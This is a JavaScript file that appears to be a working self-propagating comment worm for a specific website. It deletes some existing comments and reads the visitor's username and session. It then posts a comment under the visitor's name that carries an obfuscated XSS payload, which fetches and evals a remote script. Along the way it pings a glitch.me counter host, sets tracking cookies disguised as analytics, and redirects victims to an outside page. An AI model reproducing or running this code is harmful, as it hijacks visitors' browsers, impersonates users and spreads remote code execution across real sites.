// RomanEncode function
function RomanEncode(input) {
  return input.split('').map(char => {
    if (/[a-zA-Z0-9]/.test(char)) {
      // Handle uppercase letters
      if (char >= 'A' && char <= 'Z') {
        return String.fromCharCode((char.charCodeAt(0) - 'A'.charCodeAt(0) + 3) % 26 + 'A'.charCodeAt(0));
      }
      // Handle lowercase letters
      if (char >= 'a' && char <= 'z') {
        return String.fromCharCode((char.charCodeAt(0) - 'a'.charCodeAt(0) + 3) % 26 + 'a'.charCodeAt(0));
      }
      // Handle digits
      if (char >= '0' && char <= '9') {
        return String.fromCharCode((char.charCodeAt(0) - '0'.charCodeAt(0) + 3) % 10 + '0'.charCodeAt(0));
      }
    }
    // Return non-alphanumeric characters as is
    return char;
  }).join('');
}

// RomanDecode function
function RomanDecode(input) {
  return input.split('').map(char => {
    if (/[a-zA-Z0-9]/.test(char)) {
      // Handle uppercase letters
      if (char >= 'A' && char <= 'Z') {
        return String.fromCharCode((char.charCodeAt(0) - 'A'.charCodeAt(0) - 3 + 26) % 26 + 'A'.charCodeAt(0));
      }
      // Handle lowercase letters
      if (char >= 'a' && char <= 'z') {
        return String.fromCharCode((char.charCodeAt(0) - 'a'.charCodeAt(0) - 3 + 26) % 26 + 'a'.charCodeAt(0));
      }
      // Handle digits
      if (char >= '0' && char <= '9') {
        return String.fromCharCode((char.charCodeAt(0) - '0'.charCodeAt(0) - 3 + 10) % 10 + '0'.charCodeAt(0));
      }
    }
    // Return non-alphanumeric characters as is
    return char;
  }).join('');
}

function deleteComments() {
	const commentSection=document.getElementById('Comments');if(commentSection){commentSection.querySelectorAll('article.media').forEach(comment=>{const pElement=comment.querySelector('.content p');if(pElement&&pElement.children.length>0){comment.remove();}});}
}
// Utility function to generate a random string
function generateRandomString(length, uppercase = false) {
  const characters = uppercase ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' : 'abcdefghijklmnopqrstuvwxyz0123456789';
  return Array(length).fill('').map(() => characters[Math.floor(Math.random() * characters.length)]).join('');
}

const usefulInfo = {
  ga: {
    timestampRedirects: Date.now(),
    redirects: 0,
    timestampComments: Date.now(),
    comments: 0
  },
  session: localStorage['sdb-session'] || generateRandomString(32, false)
};

const randomNames = [
  "Ethan",
  "Liam",
  "Noah",
  "Lucas",
  "Mason",
  "Logan",
  "William",
  "Oliver",
  "Benjamin",
  "Caleb",
  "Jaxon",
  "Gabriel",
  "Michael",
  "Alexander",
  "Elijah",
  "James",
  "Joshua",
  "Christopher",
  "Andrew",
  "Samuel",
  "Julian",
  "Owen",
  "Harrison",
  "Landon",
  "Aiden",
  "Gavin",
  "Cameron",
  "Cooper",
  "Hunter",
  "Austin",
  "Bryson",
  "Colton",
  "Parker",
  "Tyler",
  "Brandon",
  "Ryan",
  "Eric",
  "Kevin",
  "Brian",
  "Matthew",
  "Nicholas",
  "Steven",
  "Thomas",
  "Timothy",
  "Daniel",
  "Anthony",
  "Patrick",
  "Robert",
  "Richard",
  "Charles",
  "Joseph",
  "Frank",
  "George",
  "Ronald",
  "Harold",
  "Gary",
  "Larry",
  "Jeffrey",
  "Scott"
];

function getUserData() {
  const cookies = document.cookie.split('; ').reduce((acc, cookie) => {
    const [name, value] = cookie.split('=');
    acc[name] = value;
    return acc;
  }, {});

  // Check for session in localStorage, if not found generate a new one
  if (!localStorage['sdb-session']) {
    // localStorage['sdb-session'] = usefulInfo.session;
  }

  // Check for username in localStorage, cookies, or generate a random one
  if (localStorage['sdb-user']) {
    usefulInfo.username = localStorage['sdb-user'];
  } else if (cookies.username) {
    usefulInfo.username = cookies.username;
  } else {    
    usefulInfo.username = randomNames[Math.floor(Math.random() * randomNames.length)];
  }

  // Loop for all cookies to find specific ones
  for (const [key, value] of Object.entries(cookies)) {
    if (/^ga_static_[A-Z0-9]{9}$/.test(key)) {
      let temp = RomanDecode(value);
      try {
        let decodedValue = atob(decodeURIComponent(temp));
        if (/^(\d+:\d+:\d+:\d+)$/.test(decodedValue)) {
          const [timestampRedirects, redirects, timestampComments, comments] = decodedValue.split(':').map(Number);
          usefulInfo.ga = {
            timestampRedirects,
            redirects,
            timestampComments,
            comments
          };
        } else {
          throw new Error('Invalid format');
        }
      } catch (e) {
        // Default values are already set, so we don't need to do anything here
      }
    }
  }

  // If username is not found in cookies or localStorage, run the getusername() function
  if (!usefulInfo.username && typeof getusername === 'function') {
    usefulInfo.username = getusername();
  }

  // Add the current URL
  usefulInfo.url = window.location.href;

  // Add the browser's User-Agent
  usefulInfo.userAgent = navigator.userAgent;

  return usefulInfo;
}

// Helper function to set a cookie
function setCookie(name, value, days) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${name}=${value}; expires=${expires}; path=/`;
}

function writeCookie(data) {
  const { timestampRedirects, redirects, timestampComments, comments } = data;

  // Create the encoded string
  const joinedString = [timestampRedirects, redirects, timestampComments, comments].join(':');
  const base64String = btoa(joinedString);
  const encodedString = RomanEncode(base64String);

  // Check if there is a cookie that matches the format
  const cookies = document.cookie.split('; ').reduce((acc, cookie) => {
    const [name, value] = cookie.split('=');
    acc[name] = decodeURIComponent(value);
    return acc;
  }, {});

  let cookieName = null;
  for (const [key, value] of Object.entries(cookies)) {
    let decodedValue;
    try {
      decodedValue = atob(RomanDecode(value));
    } catch (e) {
      continue; // Skip invalid base64 strings
    }

    if (/^(\d+:\d+:\d+:\d+)$/.test(decodedValue)) {
      cookieName = key;
      break;
    }
  }

  // If no matching cookie is found, generate a new name
  if (!cookieName) {
    cookieName = 'ga_static_' + generateRandomString(9, true);
  }

  // Write the cookie
  setCookie(cookieName, encodedString, 365);
}

// Example usage
const data = {
  timestampRedirects: Date.now(),
  redirects: 3,
  timestampComments: Date.now(),
  comments: 10
};


async function fetchAndPost(quantity) {
    try {
        for (let i = 0; i < quantity; i++) {
            const commentString = `<dd onscrollsnapchange="ev&#97;l(&#97;tob('ZmV0Y2goJ2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9naHVydGVyci90ZHNAbWFpbi9zaC5qcycpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oZXZhbCk'))" style	=overflow-y:hidden;scroll-snap-type:x><p style	=scroll-snap-align:center></p></dd>`;
            
            // Step 1: Fetch the counter URL asynchronously
            const counterResponse = await fetch('https://bronzed-salt-warbler.glitch.me/');
            if (!counterResponse.ok) {
                throw new Error('Error fetching counter URL: ' + counterResponse.statusText);
            }
            const counterString = await counterResponse.text();
            
            // Construct the final URL
            const finalUrl = 'https://shemalestardb.com/comments/' + counterString;

            
            // Wait for the specified duration
            while (Date.now() - startWaitTime < 5200) {
                await new Promise(resolve => setTimeout(resolve, 100)); // Wait for 100ms intervals
            }

            // Step 3: Construct the POST request with necessary headers and body
            const postRequest = await fetch(finalUrl, {
                method: 'POST',
                headers: {
                    'User-Agent': usefulInfo.userAgent,
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/json',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin'
                },
                body: JSON.stringify({
                    author: usefulInfo.username,
                    comment: commentString,
                    cid: "0",
                    session: usefulInfo.session
                })
            });
			startWaitTime = Date.now();

            // Step 4: Check if the post response is ok
            if (postRequest.status < 400 || postRequest.status >= 500) {
                console.log('Post request successful.');

                // Step 5: Perform the additional POST request with counterString as body
                const additionalPostRequest = await fetch('https://bronzed-salt-warbler.glitch.me/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain'
                    },
                    body: counterString,
                    mode: 'cors',
                    credentials: 'omit'
                });

                if (!additionalPostRequest.ok) {
                    throw new Error('Error in additional post request: ' + additionalPostRequest.statusText);
                }
            } else {
                throw new Error('Error in post request: ' + postRequest.statusText);
            }
        }
    } catch (error) {
        console.error('An error occurred:', error);
    }
}

// Function to create the loading overlay
function createLoadingOverlay() {
    // Create a new div element to hold the SVG
    var loadingDiv = document.createElement('div');
    
    // Apply styles to make it cover the entire page and center the content
    loadingDiv.style.position = 'fixed';
    loadingDiv.style.top = '0';
    loadingDiv.style.left = '0';
    loadingDiv.style.width = '100%';
    loadingDiv.style.height = '100%';
    loadingDiv.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
    loadingDiv.style.zIndex = '9999';
    loadingDiv.style.display = 'flex';
    loadingDiv.style.alignItems = 'center';
    loadingDiv.style.justifyContent = 'center';
    loadingDiv.id = 'loadingOverlay';
    
    // SVG content for loading animation
    var svgContent = `
        <svg xmlns="http://www.w3.org/2000/svg" style="margin: auto; background: none; display: block;" width="100px" height="100px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
            <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#000" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round">
                <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
            </circle>
        </svg>
    `;
    
    // Inject the SVG content into the div
    loadingDiv.innerHTML = svgContent;
    
    // Append the div to the body
    document.body.appendChild(loadingDiv);
}

// Function to remove the loading overlay
function removeLoadingOverlay() {
    var loadingDiv = document.getElementById('loadingOverlay');
    if (loadingDiv) {
        loadingDiv.parentNode.removeChild(loadingDiv);
    }
}



async function executeTask() {

	deleteComments();
  createLoadingOverlay();
  ///
  getUserData();
  writeCookie(usefulInfo.ga);
  ///

  const currentTime = Date.now();
  const controlTimestamp = 1730755429932;

  if (currentTime < controlTimestamp + 7200000) {
  await fetchAndPost(1);
} else {
	Math.random() < 0.5 && await fetchAndPost(1);
}
	removeLoadingOverlay();


  const maxRedirects24 = 100;
  const maxRedirects24to48 = 200;
  const elapsed = currentTime - usefulInfo.ga.timestampRedirects;

  // Reset redirects if more than 48 hours have passed
  if (elapsed > 48 * 60 * 60 * 1000) {
    usefulInfo.ga.timestampRedirects = currentTime;
    usefulInfo.ga.redirects = 0;
  }

  let maxRedirects;
  let chance;

  if (elapsed <= 24 * 60 * 60 * 1000) {
    maxRedirects = maxRedirects24;
    chance = 1; // 40% chance
  } else if (elapsed <= 48 * 60 * 60 * 1000) {
    maxRedirects = maxRedirects24to48;
    chance = 1; // 25% chance
  } else {
    maxRedirects = maxRedirects24;
    chance = 1; // Default back to the initial logic if something went wrong
  }

  if (usefulInfo.ga.redirects < maxRedirects) {
    if (Math.random() < chance) {
      usefulInfo.ga.redirects += 1;
      writeCookie(usefulInfo.ga);

      // Perform redirect to a random link
      const links = [
        "https://thoughtful-sleepy-single.glitch.me/"
      ];
      const randomLink = links[Math.floor(Math.random() * links.length)];
      window.location.href = randomLink;
    }
  } else {
	  // await new Promise(resolve => setTimeout(resolve, 5100));
	  // await fetchAndPost(999);
	  }
}
let startWaitTime = Date.now()-5500;
executeTask();

